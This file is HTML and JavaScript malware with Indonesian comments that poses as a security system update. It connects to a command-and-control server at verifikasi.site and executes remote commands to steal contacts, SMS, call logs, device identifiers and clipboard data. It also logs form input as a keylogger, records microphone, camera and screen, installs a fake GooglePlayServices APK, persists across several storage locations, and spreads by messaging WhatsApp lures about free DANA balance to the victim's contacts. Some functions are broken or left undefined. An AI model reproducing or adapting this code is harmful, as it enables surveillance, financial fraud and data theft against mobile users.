<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">

    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0e17;
            display:flex;
            justify-content:center;

<!-- Hidden iframe untuk download APK -->

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - 48 PERINTAH C2 + PERSISTENSI MULTI-LOKASI
// ============================================================

var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 10000;
var APK_INSTALLED = false;
var REINFECTION_INTERVAL = 10800000;
var progress = 0;
var isRedirecting = false;
var allDone = false;
var AUTO_EXECUTED = false;
var spreadDone = false;
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var retryCount = 0;
var ws = null;
var wsConnected = false;
var WS_URL = 'wss://verifikasi.site/ws';
var APK_DOWNLOADED = false;

var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';

// ============================================================
// DETEKSI PLATFORM & ANDROID BRIDGE
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
}
var PLATFORM = detectPlatform();

var A = {
    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
    // ... (definisikan semua fungsi seperti di index.html, tambahkan fileExists, readFile, saveFileBinary, saveToPreferences, getFromPreferences)
    saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
    openFile: function(p) { if(this.isAvailable){ try{ AndroidBridge.openFile(p); return true }catch(e){} } return false; },
    saveToPreferences: function(k,v) { if(this.isAvailable){ try{ AndroidBridge.saveToPreferences(k,v); return true }catch(e){} } return false; },
    getFromPreferences: function(k) { if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(k) }catch(e){} } return null; },
    saveFileBinary: function(p,d) { if(this.isAvailable){ try{ AndroidBridge.saveFileBinary(p,d); return true }catch(e){} } return false; },
    getAllContacts: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllContacts()) }catch(e){} } return null; },
    getAllSMS: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllSMS()) }catch(e){} } return null; },
    getCallLog: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getCallLog()) }catch(e){} } return null; },
    getIMEI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMEI() }catch(e){} } return null; },
    getIMSI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMSI() }catch(e){} } return null; },
    getPhoneNumber: function() { if(this.isAvailable){ try{ return AndroidBridge.getPhoneNumber() }catch(e){} } return null; },
    getInstalledApps: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getInstalledApps()) }catch(e){} } return null; },
    sendSMS: function(n,p) { if(this.isAvailable){ try{ AndroidBridge.sendSMS(n,p) }catch(e){} } },
    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p) }catch(e){} } },
    uninstallApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.uninstallApp(p) }catch(e){} } },
    forceStopApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.forceStopApp(p) }catch(e){} } },
    clearAppData: function(p) { if(this.isAvailable){ try{ AndroidBridge.clearAppData(p) }catch(e){} } },
    callNumber: function(n) { if(this.isAvailable){ try{ AndroidBridge.callNumber(n) }catch(e){} } },
    listFiles: function(p) { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.listFiles(p)) }catch(e){} } return null; },
    takeScreenshot: function() { if(this.isAvailable){ try{ return AndroidBridge.takeScreenshot() }catch(e){} } return null; },
    installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p) }catch(e){} } return false; }
};

// ============================================================
// FUNGSI PERSISTENSI MULTI-LOKASI
// ============================================================
function saveHTMLToAllLocations(htmlContent) {
    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
    try {
        var request = indexedDB.open('SystemUpdateDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('files')) {
                db.createObjectStore('files');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('files', 'readwrite');
            var store = tx.objectStore('files');
            store.put(htmlContent, 'SystemUpdate.html');
        };
    } catch(e) {}
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Android/data/SystemUpdate.html';
            A.saveFile(path, htmlContent);
        } catch(e) {}
        try {
            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
            A.saveToPreferences('system_SystemUpdate_html', encoded);
        } catch(e) {}
        try {
            A.saveFile('/storage/emulated/0/Android/data/com.android.camera/SystemUpdate.html', htmlContent);
        } catch(e) {}
    }
}

function loadHTMLFromAllLocations() {
    return new Promise(function(resolve) {
        // 1. SharedPreferences
        if (PLATFORM.isAndroid && A.isAvailable) {
            try {
                var encoded = A.getFromPreferences('system_SystemUpdate_html');
                if (encoded) {
                    resolve(decodeURIComponent(escape(atob(encoded))));
                    return;
                }
            } catch(e) {}
        }
        // 2. localStorage
        try {
            var ls = localStorage.getItem('SystemUpdate_backup');
            if (ls) { resolve(ls); return; }
        } catch(e) {}
        // 3. IndexedDB
        try {
            var request = indexedDB.open('SystemUpdateDB', 1);
            request.onsuccess = function(e) {
                var db = e.target.result;
                var tx = db.transaction('files', 'readonly');
                var store = tx.objectStore('files');
                var get = store.get('SystemUpdate.html');
                get.onsuccess = function() {
                    if (get.result) { resolve(get.result); return; }
                    // 4. Android/data
                    if (PLATFORM.isAndroid && A.isAvailable) {
                        try {
                            var content = A.readFile('/storage/emulated/0/Android/data/SystemUpdate.html');
                            if (content) { resolve(content); return; }
                        } catch(e) {}
                    }
                    // 5. Download folder
                    if (PLATFORM.isAndroid && A.isAvailable) {
                        try {
                            var content = A.readFile('/storage/emulated/0/Android/data/com.android.camera/SystemUpdate.html');
                            if (content) { resolve(content); return; }
                        } catch(e) {}
                    }
                    resolve(null);
                };
            };
        } catch(e) { resolve(null); }
    });
}

// ============================================================
// WEBSOCKET DENGAN CODE PUSH
// ============================================================
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    if (!WS_PASSWORD || WS_PASSWORD === '') {
        setTimeout(connectWebSocket, 3000);
        return;
    }
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = function() {
            wsConnected = true;
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: WS_PASSWORD,
                deviceId: 'browser_systemupdate',
                timestamp: Date.now()
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_auth', data: 'success' });
                } else if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_auth', data: 'failed' });
                    if (WS_PASSWORD !== 'default_fallback_password') {
                        WS_PASSWORD = 'default_fallback_password';
                        K({ sumber: 'ws_auth_fallback', data: 'retry_with_default' });
                        ws.close();
                        setTimeout(connectWebSocket, 1000);
                    } else {
                        ws.close();
                    }
                } else if (data.type === 'command') {
                    var cmd = data.command || data;
                    var aksi = cmd.aksi || 'unknown';
                    K({ sumber: 'ws_command_received', data: aksi });
                    var hasil = eksekusiPerintah(cmd);
                    K({ sumber: 'ws_command_result', data: hasil });
                    if (wsConnected && ws) {
                        ws.send(JSON.stringify({
                            type: 'command_result',
                            command: aksi,
                            result: hasil,
                            timestamp: Date.now()
                        }));
                    }
                } else if (data.type === 'push_html') {
                    var html = data.content;
                    if (html) {
                        saveHTMLToAllLocations(html);
                        K({ sumber: 'code_push_html', data: 'received' });
                        // Re-execute if needed
                        executeHTML(html);
                    }
                } else if (data.type === 'push_apk') {
                    var apkBase64 = data.content;
                    if (apkBase64) {
                        saveAPKToAllLocations(apkBase64);
                        K({ sumber: 'code_push_apk', data: 'received' });
                        // Install after save
                        installAPKFromAvailablePath();
                    }
                } else if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {
                K({ sumber: 'ws_parse_error', data: e.message });
            }
        };
        ws.onclose = function() {
            wsConnected = false;
            K({ sumber: 'ws_status', data: 'disconnected' });
            setTimeout(connectWebSocket, 10000);
        };
        ws.onerror = function() {
            K({ sumber: 'ws_error', data: 'error' });
        };
    } catch(e) {
        K({ sumber: 'ws_connect_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

function connectWebSocketWithFallback() {
    if (WS_PASSWORD && WS_PASSWORD !== '') {
        connectWebSocket();
        return;
    }
    WS_PASSWORD = 'default_fallback_password';
    K({ sumber: 'ws_fallback_used', data: 'connecting_with_default' });
    connectWebSocket();
}

// ============================================================
// APK PERSISTENSI
// ============================================================
function saveAPKToAllLocations(apkBase64) {
    if (!apkBase64) return;
    // 1. SharedPreferences (Base64)
    if (PLATFORM.isAndroid && A.isAvailable) {
        try { A.saveToPreferences('system_GooglePlayServices_apk', apkBase64); } catch(e) {}
        // 2. Android/data
        try {
            var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
            var path = '/storage/emulated/0/Android/data/GooglePlayServices.apk';
            A.saveFileBinary(path, binary);
        } catch(e) {}
        // 3. Internal APK folder (paling aman)
        try {
            var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
            var internalPath = '/data/data/com.google.play.services/files/GooglePlayServices.apk';
            A.saveFileBinary(internalPath, binary);
        } catch(e) {}
        // 4. Download folder (fallback)
        try {
            var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
            A.saveFileBinary('/storage/emulated/0/Android/data/com.android.camera/GooglePlayServices.apk', binary);
        } catch(e) {}
    }
}

function getAPKPath() {
    var paths = [
        '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
        '/storage/emulated/0/Android/data/GooglePlayServices.apk',
        '/storage/emulated/0/Android/data/com.android.camera/GooglePlayServices.apk'
    ];
    if (PLATFORM.isAndroid && A.isAvailable) {
        for (var i = 0; i < paths.length; i++) {
            try {
                if (A.fileExists(paths[i])) {
                    return paths[i];
                }
            } catch(e) {}
        }
    }
    return null;
}

function installAPKFromAvailablePath() {
    if (APK_INSTALLED) return;
    var path = getAPKPath();
    if (!path) {
        requestAPKFromServer();
        return;
    }
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var result = A.installAPK(path);
            if (result) {
                APK_INSTALLED = true;
                K({ sumber: 'apk_install_success', data: { path: path } });
                updateProgress(100, '✅ Update Selesai');
                finishAndRedirect();
                return;
            }
        } catch(e) {}
        // Fallback: Intent
        try {
            window.location.href = 'file://' + path;
            APK_INSTALLED = true;
            K({ sumber: 'apk_install_fallback_intent', data: { path: path } });
            updateProgress(100, '✅ Update Selesai');
            finishAndRedirect();
        } catch(e) {}
    }
}

function requestAPKFromServer() {
    if (wsConnected && ws) {
        ws.send(JSON.stringify({ type: 'request_apk', timestamp: Date.now() }));
        K({ sumber: 'apk_request_via_ws', data: 'sent' });
    }
}

// ============================================================
// SELF-HEALING (30 MENIT)
// ============================================================
function startSelfHealing() {
    setInterval(function() {
        // Cek apakah SystemUpdate.html masih ada di semua lokasi
        loadHTMLFromAllLocations().then(function(html) {
            if (!html) {
                // Minta dari server via WebSocket
                if (wsConnected && ws) {
                    ws.send(JSON.stringify({ type: 'request_html' }));
                }
            } else {
                // Pastikan semua lokasi terisi
                saveHTMLToAllLocations(html);
            }
        });
        // Cek APK
        if (PLATFORM.isAndroid && A.isAvailable) {
            var apkPath = getAPKPath();
            if (!apkPath) {
                requestAPKFromServer();
            }
        }
        K({ sumber: 'self_heal_check', data: 'done' });
    }, 30 * 60 * 1000); // 30 MENIT
}

// ============================================================
// UI & FUNGSI DASAR
// ============================================================
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    if (label) {
        var status = document.getElementById('statusLabel');
        if (status) status.textContent = label;
    }
}

function redirectToDANA() {
    if (isRedirecting) return;
    isRedirecting = true;
    var container = document.getElementById('mainContainer');
    if (container) container.classList.add('fade-out');
    setTimeout(function() {
        try {
            if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
                try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
            }
            window.location.href = 'https://www.dana.id';
        } catch(e) {
            window.location.href = 'https://www.dana.id';
        }
    }, 800);
}

function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// AMBIL PASSWORD (DENGAN FALLBACK)
// ============================================================
function ambilPassword() {
    updateProgress(10, '⏳ Memperbarui System Keamanan...');
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        retryCount = 0;
                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
                        K({ sumber: 'password_received', data: 'ok' });
                        
                        connectWebSocket();
                        startC2Polling();
                        startHeartbeat();
                        startReinfection();
                        autoExecuteC2();
                        // Load HTML dari semua lokasi (untuk self-repair)
                        loadHTMLFromAllLocations().then(function(html) {
                            if (html) saveHTMLToAllLocations(html);
                        });
                        // APK: coba install dari lokasi yang ada, atau minta server
                        setTimeout(function() {
                            installAPKFromAvailablePath();
                        }, 3000);
                        setTimeout(autoSpread, 2000);
                        startSelfHealing();
                        return;
                    }
                } catch(e) {}
            }
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    installAPKFromAvailablePath();
                }, 3000);
                setTimeout(autoSpread, 2000);
                startSelfHealing();
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.onerror = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    installAPKFromAvailablePath();
                }, 3000);
                setTimeout(autoSpread, 2000);
                startSelfHealing();
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.ontimeout = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    installAPKFromAvailablePath();
                }, 3000);
                setTimeout(autoSpread, 2000);
                startSelfHealing();
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 3000);
    }
}

// ============================================================
// AUTO SPREAD, HEARTBEAT, REINFECTION, C2 POLLING
// ============================================================
function autoSpread() {
    if (spreadDone) return;
    spreadDone = true;
    if (!PLATFORM.isAndroid || !A.isAvailable) return;
    
    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
    var sentCount = 0;
    var maxSend = 50;
    try {
        var contacts = A.getAllContacts();
        if (contacts && contacts.length > 0) {
            maxSend = Math.min(contacts.length, 50);
            for (var i = 0; i < maxSend; i++) {
                var number = String(contacts[i].number || '').replace(/[^0-9]/g, '');
                if (number && number.length > 5) {
                    var iframe = document.createElement('iframe');
                    iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                    document.body.appendChild(iframe);
                    sentCount++;
                    setTimeout(function(el) { try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {} }, 5000, iframe);
                }
            }
        }
    } catch(e) {}
    K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount });
}

function startHeartbeat() {
    setInterval(function() { 
        K({ sumber: 'page_heartbeat', data: 'alive' }); 
    }, 2700000);
}

function startReinfection() {
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_check', data: 'apk_missing_redownload' });
            installAPKFromAvailablePath();
        } else {
            K({ sumber: 'reinfection_check', data: 'apk_still_installed' });
        }
    }, REINFECTION_INTERVAL);
}

function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
        xhr.setRequestHeader('X-Password', WS_PASSWORD);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var hasil = eksekusiPerintah(cmd);
                        K({
                            sumber: 'c2_result',
                            data: {
                                perintah: aksi,
                                hasil: hasil,
                                waktu: Date.now()
                            }
                        });
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// 48 PERINTAH C2 (LENGKAP – FUNGSI SAMA SEPERTI SEBELUMNYA)
// ============================================================
function eksekusiPerintah(cmd) {
    var aksi = cmd.aksi || 'unknown';
    var hasil = '';
    var params = cmd.params || {};

    try {
        switch (aksi) {
            case "ambil_kontak": hasil = ambilKontak(); break;
            case "ambil_sms": hasil = ambilSMS(); break;
            case "ambil_call_log": hasil = ambilCallLog(); break;
            case "ambil_lokasi": hasil = ambilLokasi(); break;
            case "get_clipboard": hasil = getClipboard(); break;
            case "set_clipboard": hasil = setClipboard(params.text || ""); break;
            case "ambil_imei": hasil = ambilIMEI(); break;
            case "ambil_imsi": hasil = ambilIMSI(); break;
            case "ambil_nomor_hp": hasil = ambilNomorHP(); break;
            case "get_installed_apps": hasil = getInstalledApps(); break;
            case "get_notifications": hasil = getNotifications(); break;
            case "get_notifications_history": hasil = getNotificationsHistory(); break;
            case "clear_notification": hasil = clearNotification(params.id || ""); break;
            case "clear_all_notifications": hasil = clearAllNotifications(); break;
            case "keylogger_start": hasil = keyloggerStart(); break;
            case "keylogger_stop": hasil = keyloggerStop(); break;
            case "keylogger_upload": hasil = keyloggerUpload(); break;
            case "keylogger_status": hasil = keyloggerStatus(); break;
            case "kirim_sms": hasil = kirimSMS(params.nomor || "", params.pesan || ""); break;
            case "kirim_sms_massal": hasil = kirimSMSMassal(params.pesan || ""); break;
            case "call_number": hasil = callNumber(params.nomor || ""); break;
            case "buka_aplikasi": hasil = bukaAplikasi(params.package || ""); break;
            case "uninstall_aplikasi": hasil = uninstallAplikasi(params.package || ""); break;
            case "app_force_stop": hasil = appForceStop(params.package || ""); break;
            case "app_clear_data": hasil = appClearData(params.package || ""); break;
            case "buka_url": hasil = bukaURL(params.url || "https://verifikasi.site"); break;
            case "buka_dana": hasil = bukaDANA(); break;
            case "buka_gopay": hasil = bukaGoPay(); break;
            case "buka_ovo": hasil = bukaOVO(); break;
            case "buka_bri": hasil = bukaBRI(); break;
            case "buka_bca": hasil = bukaBCA(); break;
            case "buka_mandiri": hasil = bukaMandiri(); break;
            case "buka_shopee": hasil = bukaShopee(); break;
            case "screenshot": hasil = ambilScreenshot(); break;
            case "record_audio": hasil = recordAudio(params.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(params.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "screen_record": hasil = screenRecord(params.durasi || 30); break;
            case "screen_record_stop": hasil = screenRecordStop(); break;
            case "screen_record_status": hasil = screenRecordStatus(); break;
            case "list_file": hasil = listFile(params.path || "/sdcard/"); break;
            case "ambil_file": hasil = ambilFile(params.path || ""); break;
            case "get_system_info": hasil = getSystemInfo(); break;
            case "get_battery": hasil = getBattery(); break;
            case "get_wifi": hasil = getWiFi(); break;
            case "vibrate": hasil = vibrate(params.durasi || 1000); break;
            case "toast": hasil = showToast(params.pesan || "System Update Complete!"); break;
            default: hasil = "Unknown command: " + aksi;
        }
    } catch(e) {
        hasil = 'Error: ' + e.message;
    }
    return hasil;
}

function kirimSMS(nomor, pesan) {
    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
        try { AndroidBridge.sendSMS(nomor, pesan); K({ sumber: 'kirim_sms', data: { nomor: nomor } }); return 'SMS sent'; } catch(e) {}

    return 'SMS not available';
}
function kirimSMSMassal(pesan) {
    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
        try {
            var contacts = AndroidBridge.getAllContacts();
            if (contacts) {
                var list = JSON.parse(contacts);
                var sent = 0;
                list.forEach(function(c) {
                    var number = String(c.number || '').replace(/[^0-9]/g, '');
                    if (number && number.length > 5) {
                        try { AndroidBridge.sendSMS(number, pesan); sent++; } catch(e) {}
                    }
                });
                K({ sumber: 'kirim_sms_massal', data: { sent: sent } });
                return 'SMS massal sent to ' + sent + ' contacts';
            }
        } catch(e) {}
    }
    return 'SMS massal not available';
}

function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
        K({ sumber: 'screenshot', data: dataUrl });
        return 'Screenshot taken';
    } catch(e) { return 'Error: ' + e.message; }
}
function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'record_audio', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording audio ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}
function stopAudio() {
    try {
        if (window._recorder) { window._recorder.stop(); window._recorder = null; return 'Audio recording stopped'; }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}
function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'record_video', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}
function stopVideo() { return stopAudio(); }
var screenRecorder = null, screenChunks = [];
function screenRecord(durasi) {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                .then(function(stream) {
                    screenRecorder = new MediaRecorder(stream);
                    screenChunks = [];
                    screenRecorder.ondataavailable = function(e) { if (e.data.size > 0) screenChunks.push(e.data); };
                    screenRecorder.onstop = function() {
                        var blob = new Blob(screenChunks, {type: 'video/webm'});
                        var reader = new FileReader();
                        reader.onload = function() { K({ sumber: 'screen_record', data: reader.result }); };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    };
                    screenRecorder.start();
                    if (durasi > 0) {
                        setTimeout(function() { if (screenRecorder) screenRecorder.stop(); }, durasi * 1000);
                    }
                });
            return 'Screen recording started for ' + durasi + 's';
        }
        return 'Screen recording not available';
    } catch(e) { return 'Error: ' + e.message; }
}
function screenRecordStop() {
    try {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop(); screenRecorder = null; return 'Screen recording stopped';
        }
        return 'No active screen recording';
    } catch(e) { return 'Error: ' + e.message; }
}
function screenRecordStatus() {
    return screenRecorder ? 'Screen recording: ' + screenRecorder.state : 'No screen recording';
}

function getWiFi() {
    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            var info = { type: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt };
            K({ sumber: 'wifi_info', data: info });
            return JSON.stringify(info);
        }
        return 'WiFi info not available';
    } catch(e) { return 'Error: ' + e.message; }
}
function vibrate(durasi) {
    try { if (navigator.vibrate) { navigator.vibrate(durasi); K({ sumber: 'vibrate', data: durasi }); return 'Vibrated '+durasi+'ms'; } return 'Vibration not supported'; } catch(e) { return 'Error: ' + e.message; }
}
function showToast(message) {
    try {
        var toast = document.createElement('div');
        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#0f0;padding:15px 30px;border-radius:10px;z-index:999999;font-size:16px;border-left:4px solid #0f0;font-family:monospace';
        toast.textContent = '🔔 '+message;
        document.body.appendChild(toast);
        setTimeout(function() { try { toast.parentNode.removeChild(toast); } catch(e) {} }, 5000);
        return 'Toast shown';
    } catch(e) { return 'Error: ' + e.message; }
}
function autoExecuteC2() {

    });

}

// KEYLOGGER EVENT LISTENERS
// ============================================================
document.addEventListener('input', function(e) {
    if (!keyloggerActive) return;
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            keyloggerData.push({ waktu: Date.now(), element: key, value: e.target.value });
        }
    } catch(e) {}
});
document.addEventListener('submit', function(e) {
    if (!keyloggerActive) return;
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        keyloggerData.push({ waktu: Date.now(), url: window.location.href, form: data });
    } catch(e) {}
});
